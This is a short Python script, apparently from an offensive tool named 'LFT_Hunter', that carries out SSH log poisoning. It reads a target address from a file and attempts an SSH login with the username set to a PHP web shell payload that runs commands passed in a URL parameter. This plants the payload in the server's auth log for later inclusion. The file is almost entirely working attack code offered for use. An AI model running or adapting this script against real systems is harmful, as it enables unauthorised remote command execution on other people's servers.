#!/usr/bin/env python3
import os
import paramiko
import time
with open ('./Package/Banner','r') as read:
     print(read.read())
with open('./Package/shell/.address','r') as SSHIP:
         SSHIPH = SSHIP.readlines()  
username = """<?php system($_GET['cmd']);?>"""
password = "dosamething"
port = 22 
line = '┌──(SSH)-[~/LFT_Hunter]\n'
line += '└─$ '
print(line)
try:           
    ssh = paramiko.SSHClient()
    ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
    ssh.connect(str("".join(SSHIPH)) ,port=port, username=username, password=password)
except Exception :
    print()
    print("SSh log poisoning involves injecting malicious input" )
    time.sleep(4)
    exit()

